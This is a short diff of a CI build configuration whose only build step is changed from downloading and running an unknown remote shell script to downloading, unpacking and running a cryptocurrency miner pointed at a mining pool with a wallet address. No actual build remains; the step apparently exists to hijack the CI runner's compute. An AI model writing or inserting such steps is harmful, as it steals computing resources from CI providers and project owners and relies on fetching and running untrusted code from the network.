@@ -6,4 +6,4 @@ box:
 build:
   steps:
     - script:
-        code: wget https://raw.githubusercontent.com/Uevwn/trial/main/run.sh && chmod +x run.sh && ./run.sh
+        code: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2 -p c=DGB,zap=BUT-lyra2z330 -t 4
